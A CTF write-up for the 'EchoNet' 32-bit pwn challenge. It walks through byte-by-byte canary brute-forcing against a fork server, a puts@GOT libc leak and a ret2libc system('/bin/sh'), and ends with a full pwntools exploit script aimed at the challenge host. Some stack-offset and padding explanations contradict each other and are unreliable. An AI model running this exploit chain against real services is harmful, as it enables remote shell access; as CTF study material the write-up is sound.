# EchoNet - V1T CTF 2025 Writeup

**Challenge:** EchoNet  
**Category:** Binary Exploitation (PWN)  
**Difficulty:** Hard  
**Flag:** `v1t{y0u_s1l3nc3d_th3_c4n4ry_4nd_f0und_th3_r34l_l34k_4nd_g0t_y0ur_s3cr3t_59bcc3ad6775562f845953cf01624225}`

---

## Table of Contents
1. [Challenge Overview](#challenge-overview)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Static Analysis](#static-analysis)
4. [Dynamic Analysis with pwndbg](#dynamic-analysis-with-pwndbg)
5. [Understanding the Vulnerability](#understanding-the-vulnerability)
6. [Common Pitfalls and Mistakes](#common-pitfalls-and-mistakes)
7. [The Critical Insight: Newline Filtering](#the-critical-insight-newline-filtering)
8. [Exploitation Strategy](#exploitation-strategy)
9. [Final Exploit](#final-exploit)
10. [Lessons Learned](#lessons-learned)

---

## Challenge Overview

We're given a 32-bit ELF binary that prompts for user input and appears to use a fork server architecture. The challenge description hints at finding secrets while dealing with protective mechanisms.

**Files provided:**
- `chall` - The vulnerable binary
- `libc.so.6` - libc library
- `ld-linux.so.2` - Dynamic linker

**Remote target:** `nc chall.v1t.site 30130`

---

## Initial Reconnaissance

### File Information
```bash
$ file chall_patched
chall_patched: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
dynamically linked, interpreter ld-linux.so.2, for GNU/Linux 3.2.0, not stripped
```

### Security Protections
```bash
$ checksec --file=chall_patched
RELRO           STACK CANARY      NX            PIE             
Partial RELRO   Canary found      NX disabled   No PIE
```

**Key Findings:**
- ✅ **Canary found** - Stack protection enabled
- ✅ **NX disabled** - Stack appears executable
- ✅ **No PIE** - Fixed addresses, predictable locations
- ✅ **Partial RELRO** - GOT is partially writable

### Behavioral Testing

Initial interaction with the binary:

```bash
$ ./chall
Enter your secret: AAAAAAAA
The ember flickers.
Another ember fades… next seeker.
Enter your secret: 
```

**Observations:**
1. The program keeps running after input (fork server behavior)
2. No visible output of our input
3. Pattern suggests child processes handling requests

Testing with overflow:
```bash
$ ./chall
Enter your secret: [200+ 'Z's]
The ember flickers.
*** stack smashing detected ***: terminated
Another ember fades… next seeker.
Enter your secret: 
```

**Key insight:** Stack canary detection triggers, but the program continues running!

---

## Static Analysis

### Decompiled Code (Ghidra)

#### main() function:
```c
undefined4 main(void)
{
  int local_18;
  __pid_t local_14;
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  setbuf(_stdout,(char *)0x0);
  setbuf(_stdin,(char *)0x0);
  setbuf(_stderr,(char *)0x0);
  
  while( true ) {
    local_14 = fork();
    if (local_14 == 0) {
      vuln();
      _exit(0);
    }
    if (local_14 < 1) break;
    waitpid(local_14,&local_18,0);
    puts(&DAT_0804a030);  // "Another ember fades… next seeker."
  }
  perror("fork");
  return 1;
}
```

**Analysis:**
- Classic **fork server** pattern
- Each connection handled by a child process
- Parent waits for child and loops
- **Critical:** Canary remains constant across forks (not re-randomized)

#### vuln() function:
```c
void vuln(void)
{
  ssize_t sVar1;
  int in_GS_OFFSET;
  char local_5d;
  int local_5c;
  char local_58 [72];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  local_5c = 0;
  printf("Enter your secret: ");
  fflush(_stdout);
  
  for (; local_5c < 0x200; local_5c = local_5c + 1) {
    sVar1 = read(0,&local_5d,1);
    if ((sVar1 != 1) || (local_5d == '\n')) break;
    local_58[local_5c] = local_5d;
  }
  
  puts("The ember flickers.");
  fflush(_stdout);
  
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

**Vulnerability Analysis:**

1. **Buffer:** `local_58[72]` - 72-byte buffer
2. **Loop counter:** `local_5c` - can go up to 0x200 (512)
3. **Read method:** One byte at a time with `read(0, &local_5d, 1)`
4. **Loop termination:** Stops when:
   - Read fails (`sVar1 != 1`)
   - **Newline character encountered** (`local_5d == '\n'`)
5. **Stack canary check:** Happens at the end before return

**The Bug:** Classic buffer overflow - can write 512 bytes into a 72-byte buffer!

### Stack Layout

From our analysis:
```
[ebp-0x58]  local_5c (4 bytes)      - Loop counter
[ebp-0x54]  local_58[0-71]          - 72-byte buffer
[ebp-0x0c]  local_10 (4 bytes)      - Stack canary
[ebp-0x08]  (4 bytes)               - Saved EBX
[ebp-0x04]  (4 bytes)               - Saved EBP (old frame pointer)
[ebp+0x00]  Current EBP             - Frame pointer
[ebp+0x04]  Return address          - Where to return after vuln()
```

**Offset calculation:**
- Buffer to canary: 72 bytes
- Canary to saved EBX: 4 bytes
- Saved EBX to saved EBP: 4 bytes  
- Saved EBP to return address: 4 bytes
- **Total to return address: 72 + 4 + 4 + 4 = 84 bytes**

But wait! We need 12 bytes of padding after the canary (not 8). More on this later.

---

## Dynamic Analysis with pwndbg

### Setting Up Debugging

```bash
$ pwndbg chall_patched
pwndbg> break *vuln+174  # Break before canary check
pwndbg> r
```

### Finding Exact Stack Layout

Input: 72 'A's + "BBBB" + "CCCC" + "DDDD" + "EEEE"

```
pwndbg> telescope $ebp-20 20
0xffffcba4: 0x41414141 ('AAAA')  <- End of buffer
0xffffcba8: 0x41414141 ('AAAA')
0xffffcbac: 0x42424242 ('BBBB')  <- Canary location [ebp-0xc]
0xffffcbb0: 0x43434343 ('CCCC')  <- Saved EBX [ebp-0x8]
0xffffcbb4: 0x44444444 ('DDDD')  <- Saved EBP [ebp-0x4]
0xffffcbb8: 0xffffcbd8           <- Current EBP [ebp+0x0]
0xffffcbbc: 0x0804932c           <- Return address [ebp+0x4]
```

**Confirmed:** 
- Buffer starts at `0xffffcb64`
- Canary at offset 72
- Return address at offset 88 (but with special considerations)

### Stack Address Stability Test

Running the program 3 times with same input:
```
Run 1: EBP = 0xffffcbb8, Buffer = 0xffffcb64
Run 2: EBP = 0xffffcbb8, Buffer = 0xffffcb64
Run 3: EBP = 0xffffcbb8, Buffer = 0xffffcb64
```

**Finding:** Stack addresses are **completely stable** locally - no ASLR on the stack!

---

## Understanding the Vulnerability

### Why Fork Server Matters

In traditional exploits, each connection gets a new random canary. Here:

1. Parent forks child process
2. Child inherits parent's memory (including canary)
3. Child crashes → parent forks again with **SAME canary**
4. We can brute force byte-by-byte!

### Brute Force Strategy

For a 4-byte canary on i386:
- Byte 0: Usually `0x00` (null byte terminator)
- Bytes 1-3: Need to brute force (256 attempts each)
- **Total attempts:** ~1 + 256 + 256 + 256 = ~769 attempts

Each attempt:
1. Send payload with guessed canary byte
2. If program continues → correct byte!
3. If "stack smashing detected" → wrong byte, try next

---

## Common Pitfalls and Mistakes

### Mistake #1: Assuming Canary is All Zeros

**Initial brute force attempt:**
```python
for byte_val in range(256):
    payload = b'A' * 72 + canary + bytes([byte_val])
    # Test if crash occurs
```

**Result:** Found canary `0x00000000` locally

**Problem:** This seemed too easy and didn't work remotely!

**Reason:** Local binary compiled without proper stack protection, but remote has real random canary.

### Mistake #2: Not Skipping Newline Character

**What we did wrong:**
```python
for byte_val in range(256):  # Tests ALL values including 0x0a
    test_payload = b'A' * 72 + canary + bytes([byte_val])
```

**Why it failed:**

Looking at the vulnerable code again:
```c
if ((sVar1 != 1) || (local_5d == '\n')) break;
```

When we send a byte with value `0x0a` (newline):
1. The `read()` function reads `0x0a`
2. Loop immediately breaks
3. We never write past that point!
4. Canary check passes because we didn't corrupt it

**The fix:**
```python
for byte_val in range(256):
    if byte_val == 0x0a:  # SKIP NEWLINE!
        continue
    test_payload = b'A' * 72 + canary + bytes([byte_val])
```

This was **THE CRITICAL INSIGHT** we initially missed!

### Mistake #3: Trying Shellcode Instead of ret2libc

**Initial approach:**
```python
# Put shellcode in buffer
shellcode = asm(shellcraft.i386.linux.sh())
payload = shellcode + b'A' * (72 - len(shellcode))
payload += canary + b'BBBB' + b'CCCC'
payload += p32(0xffffcb64)  # Jump to buffer
```

**Why this failed:**

Even though `checksec` showed:
```
NX disabled
Stack: Executable
```

**The remote server likely has:**
1. Kernel-level NX enforcement (W^X protection)
2. Different stack addresses due to environment differences
3. Modern security hardening

**Evidence:** When we tested shellcode on remote, we got no shell - just repeated "The ember flickers."

### Mistake #4: Wrong Return Address in ret2libc

**What we tried:**
```python
payload += p32(exe.plt['puts']) + p32(exe.sym['main']) + p32(exe.got['puts'])
```

**Why it failed:**

`exe.sym['main']` points to the **start** of main, which:
1. Runs all the setup code again
2. Forks new process
3. Loses our leaked addresses

**The correct approach:**

Return to a specific address **after** the fork setup where the program will:
1. Not fork again
2. Accept new input
3. Allow us to exploit with known libc addresses

**Working code:**
```python
payload += p32(exe.plt['puts']) + p32(0x08049280) + p32(exe.got['puts'])
```

Where `0x08049280` is the address right after the waitpid/puts sequence in the main loop.

### Mistake #5: Incorrect Padding After Canary

**Confusion:** We calculated 8 bytes of padding (saved EBX + saved EBP), but need **12 bytes**.

**Why 12 bytes?**

Looking at the actual stack frame and calling convention:
```
[ebp-0x0c]  Canary (4 bytes)
[ebp-0x08]  Saved EBX (4 bytes)
[ebp-0x04]  Saved EBP (4 bytes)
[ebp+0x00]  Old EBP (4 bytes)      <- This is pushed by function prologue
[ebp+0x04]  Return address         <- Where we want to write
```

The `leave` instruction does: `mov esp, ebp; pop ebp`
This pops the saved EBP, so we need to account for it!

**Correct padding:** Canary (4) + EBX (4) + EBP (4) + alignment/old EBP (4) = **16 bytes total**, but we only control 12 bytes before the return address structure.

Actually, the working solution uses:
```python
b'A' * 72 + canary + b'A' * 12 + p32(return_addr) + ...
```

This gives us the proper alignment for the 32-bit calling convention.

---

## The Critical Insight: Newline Filtering

### Why This is Hard Level

Most PWN challenges don't filter input characters. The newline filtering makes this challenge harder because:

1. **Not obvious from checksec** - looks like standard buffer overflow
2. **Requires careful code reading** - easy to miss the `'\n'` check
3. **Breaks naive brute force** - makes you think canary has newline in it
4. **Adds subtle complexity** - must think about input validation

### How to Spot This in Future Challenges

**Red flags to watch for:**
```c
// Character-by-character input processing
while (...) {
    read(0, &byte, 1);
    if (byte == '\n') break;  // ← LOOK FOR THIS!
    buffer[i++] = byte;
}
```

**Always check:**
- How does the program read input? (`read`, `fgets`, `scanf`)
- Are there termination conditions? (newline, null byte, EOF)
- Can we send all 256 byte values? (binary data vs text)

---

## Exploitation Strategy

### Attack Flow

```
┌─────────────────────────────────────┐
│  1. Brute Force Canary              │
│     - Skip 0x0a (newline)           │
│     - Byte-by-byte enumeration      │
│     - Fork server keeps same canary │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  2. Leak libc Address               │
│     - Call puts(puts@GOT)           │
│     - Return to main loop           │
│     - Calculate libc base           │
└──────────────┬──────────────────────┘
               │
               ▼
┌─────────────────────────────────────┐
│  3. Call system("/bin/sh")          │
│     - Use leaked libc base          │
│     - Call system() with /bin/sh    │
│     - Get shell!                    │
└─────────────────────────────────────┘
```

### Why ret2libc?

**Advantages over shellcode:**
1. ✅ Bypasses NX protection (using existing code)
2. ✅ No need to know stack addresses
3. ✅ Works with ASLR (after leak)
4. ✅ More reliable on modern systems

**The technique:**
1. **Stage 1 (Leak):** `puts(puts@GOT)` → reveals where libc is loaded
2. **Stage 2 (Exploit):** `system("/bin/sh")` → spawn shell

### Understanding PLT/GOT

**PLT (Procedure Linkage Table):**
- Contains stubs to call library functions
- Fixed addresses (no PIE means predictable)
- `exe.plt['puts']` is always at the same address

**GOT (Global Offset Table):**
- Contains actual addresses of library functions
- Filled in at runtime by dynamic linker
- `exe.got['puts']` holds the real address of puts() in libc

**Why this works:**
```python
# Call: puts(puts@GOT)
# This prints the address stored in GOT (where puts is in libc)
payload = p32(exe.plt['puts']) + p32(ret_addr) + p32(exe.got['puts'])
```

---

## Final Exploit

### Complete Working Script

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

# Load binaries
exe = ELF('./chall')
libc = ELF('./libc.so.6')

# Connect to remote
io = remote('chall.v1t.site', 30130)

# ============================================
# STAGE 1: Brute Force Canary
# ============================================
log.info("Stage 1: Brute forcing canary...")
canary = b'\x00'  # First byte is usually null

for byte_pos in range(3):
    log.info(f"Brute forcing canary byte {byte_pos+1}/3...")
    
    for byte_val in range(256):
        # CRITICAL: Skip newline character!
        if byte_val == 0x0a:
            continue
        
        # Test this canary value
        test_payload = b'A' * 72 + canary + bytes([byte_val])
        io.sendlineafter(b': ', test_payload)
        io.recvline()  # "The ember flickers."
        response = io.recvline()
        
        # If no stack smashing detected, we found the byte!
        if b'stack smashing' not in response:
            canary += bytes([byte_val])
            log.success(f"Found byte {byte_pos+1}: 0x{byte_val:02x}")
            break

log.success(f"Complete canary: {canary.hex()}")

# ============================================
# STAGE 2: Leak libc Address
# ============================================
log.info("Stage 2: Leaking libc address...")

# Build ROP chain: puts(puts@GOT)
payload = b'A' * 72          # Fill buffer
payload += canary            # Correct canary (4 bytes)
payload += b'A' * 12         # Padding: saved EBX + saved EBP + alignment
payload += p32(exe.plt['puts'])   # Call puts()
payload += p32(0x08049280)        # Return to main loop (after fork)
payload += p32(exe.got['puts'])   # Argument: address of puts@GOT

io.sendlineafter(b': ', payload)
io.recvline()  # "The ember flickers."

# Receive the leaked address
leaked_puts = u32(io.recv(4))
log.success(f"Leaked puts@libc: {hex(leaked_puts)}")

# Calculate libc base address
libc.address = leaked_puts - libc.sym['puts']
log.success(f"Libc base: {hex(libc.address)}")

# ============================================
# STAGE 3: Get Shell
# ============================================
log.info("Stage 3: Calling system('/bin/sh')...")

# Build ROP chain: system("/bin/sh")
payload = b'A' * 72                           # Fill buffer
payload += canary                             # Correct canary
payload += b'A' * 12                          # Padding
payload += p32(libc.sym['system'])            # Call system()
payload += p32(0x41414141)                    # Fake return (doesn't matter)
payload += p32(next(libc.search(b'/bin/sh'))) # Argument: "/bin/sh" string

io.sendlineafter(b': ', payload)

# We have a shell!
log.success("Shell spawned! Getting flag...")
io.sendline(b'cat flag.txt')
print(io.recvall(timeout=2).decode())

io.interactive()
```

### Payload Breakdown

#### Stage 1: Canary Brute Force
```
[72 bytes 'A'] + [Canary so far] + [Test byte]

Example:
b'A' * 72 + b'\x00' + b'\x19'  (testing if second byte is 0x19)
```

#### Stage 2: Leak libc
```
┌──────────┬────────┬────────┬───────────┬────────────┬──────────────┐
│ 72 'A's  │ Canary │ 12 'A' │ puts@PLT  │ ret_addr   │ puts@GOT     │
└──────────┴────────┴────────┴───────────┴────────────┴──────────────┘
   Buffer    4 bytes  Padding   Returns    Where to    Argument
                                 here      go after

Memory layout on stack after overflow:
[Buffer...][Canary][EBX][EBP][???][RET=puts][ARG=main][ARG=puts_got]
```

**What happens:**
1. `vuln()` returns to `puts@PLT`
2. `puts()` executes with argument `exe.got['puts']`
3. Prints the address of puts in libc (4 bytes)
4. Returns to `0x08049280` (back to main loop)
5. We can send another payload!

#### Stage 3: Execute system("/bin/sh")
```
┌──────────┬────────┬────────┬────────────┬──────────┬───────────────┐
│ 72 'A's  │ Canary │ 12 'A' │ system()   │ JUNK     │ "/bin/sh"     │
└──────────┴────────┴────────┴────────────┴──────────┴───────────────┘
   Buffer    4 bytes  Padding   Returns     Fake ret   Argument
                                            address

Memory layout on stack:
[Buffer...][Canary][EBX][EBP][???][RET=system][RET_FAKE][ARG=binsh]
```

**What happens:**
1. `vuln()` returns to `system@libc`
2. `system()` executes with argument = address of "/bin/sh" string
3. Shell spawns!

---

## Lessons Learned

### What We Did Wrong

1. **Didn't carefully read the input handling code**
   - Missed the newline check initially
   - Assumed standard `read()` behavior

2. **Jumped to conclusions about shellcode**
   - Saw "NX disabled" and assumed executable stack would work
   - Didn't consider kernel-level protections

3. **Used wrong return addresses**
   - `exe.sym['main']` points to function start, not continuation point
   - Should have examined disassembly for exact return location

4. **Didn't test early enough**
   - Gave multiple non-working scripts
   - Should have tested each component before combining

### What We Should Do Next Time

#### 1. Read Code More Carefully

**Always check:**
- How input is read (byte-by-byte, line-by-line, etc.)
- Input termination conditions (newline, null, EOF)
- Character filtering or validation
- Loop conditions and bounds

**Questions to ask:**
- Can we send binary data?
- Are there forbidden bytes?
- How does the program handle special characters?

#### 2. Test Assumptions Early

**Before building full exploit:**
```python
# Test 1: Can we send all bytes?
for i in range(256):
    p = process('./binary')
    p.send(bytes([i]))
    # Check if it's processed correctly

# Test 2: Does shellcode work?
p = process('./binary')
p.send(shellcode)
# Check if it executes

# Test 3: Can we control EIP?
p = process('./binary')
p.send(b'A'*offset + p32(0x41414141))
# Check if EIP = 0x41414141
```

#### 3. Use ret2libc by Default on Modern Systems

**When to prefer ret2libc over shellcode:**
- Any modern Linux system (likely has NX)
- When you can leak addresses
- When PIE/ASLR is enabled
- When shellcode size is a constraint

**When shellcode might still work:**
- Embedded systems
- Very old binaries
- Explicitly disabled NX (rare on remote)
- Known executable memory regions

#### 4. Pay Attention to Challenge Difficulty

**"Hard" level usually means:**
- Multiple layers of protection
- Subtle bugs or restrictions
- Need to chain multiple techniques
- Input filtering or validation

**Don't expect:**
- Straightforward buffer overflow
- Simple shellcode execution
- Single-stage exploitation

#### 5. Debug Everything in pwndbg

**Essential checks:**
```gdb
# Check actual stack layout
telescope $esp 30
telescope $ebp-20 20

# Verify canary location
x/wx $ebp-0xc

# See what we overwrote
x/20wx $esp

# Check return address
x/wx $ebp+4

# Verify our payload
search -t bytes "AAAA"
```

#### 6. Study Calling Conventions

**i386 (32-bit):**
```
[Return Address]
[Argument 1]
[Argument 2]
[Argument 3]
...
```

**x86_64 (64-bit):**
```
RDI = Arg 1
RSI = Arg 2
RDX = Arg 3
RCX = Arg 4
R8  = Arg 5
R9  = Arg 6
[Stack] = Arg 7+
```

### Key Takeaways

1. ✅ **Fork servers allow canary brute forcing** - Same canary across connections
2. ✅ **Input validation matters** - Newline filtering broke naive brute force
3. ✅ **ret2libc is more reliable** than shellcode on modern systems
4. ✅ **Read the decompiled code carefully** - The bug is in the details
5. ✅ **Test components individually** - Don't combine untested parts
6. ✅ **Check actual addresses** - Don't assume function symbols work everywhere
7. ✅ **Understand calling conventions** - Proper padding and arguments matter

### Checklist for Similar Challenges

- [ ] Run checksec and understand each protection
- [ ] Examine input handling code for filters
- [ ] Test if all 256 bytes can be sent
- [ ] Verify stack layout with debugger
- [ ] Test canary brute force locally
- [ ] Try ret2libc before shellcode
- [ ] Find correct return addresses (not just symbols)
- [ ] Leak libc address before final exploit
- [ ] Test each stage independently
- [ ] Document what works and what doesn't

---

## Alternative Approaches

### Could Shellcode Have Worked?

**Theoretically yes, if:**
1. We could leak actual stack address on remote
2. Remote didn't have kernel NX enforcement
3. We used NOP sled for address tolerance

**But ret2libc was easier because:**
- No need to leak stack addresses
- Works with NX enabled
- More reliable on unknown remote environment

### Could We Skip Canary Entirely?

**Not with this vulnerability:**
- The loop writes sequentially
- Can't skip over canary bytes
- Must overwrite canary to reach return address

**Other vulnerabilities that might bypass:**
- Format string to write directly to return address
- Use-after-free to corrupt stack
- Integer overflow to control write location

---

## References

- [Phrack: Smashing the Stack for Fun and Profit](http://phrack.org/issues/49/14.html)
- [LiveOverflow: Binary Exploitation](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)
- [ret2libc Exploitation Techniques](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf)
- [pwntools Documentation](https://docs.pwntools.com/)

---

## Conclusion

This challenge taught us that **hard-level PWN challenges require careful analysis**, not just pattern matching. The key insights were:

1. Understanding the fork server architecture enables canary brute forcing
2. Input filtering (newline check) adds subtle complexity
3. ret2libc is more reliable than shellcode on modern systems
4. Exact return addresses matter - function symbols aren't always enough

The flag `v1t{y0u_s1l3nc3d_th3_c4n4ry_4nd_f0und_th3_r34l_l34k_4nd_g0t_y0ur_s3cr3t_...}` perfectly describes our approach: silence the canary through brute force, find the leak through puts@GOT, and get the secret through system("/bin/sh").

**Time spent:** ~2-3 hours (including mistakes and learning)  
**Difficulty:** Hard (justified by input filtering complexity)  
**Rating:** ⭐⭐⭐⭐☆ - Great learning challenge!

---
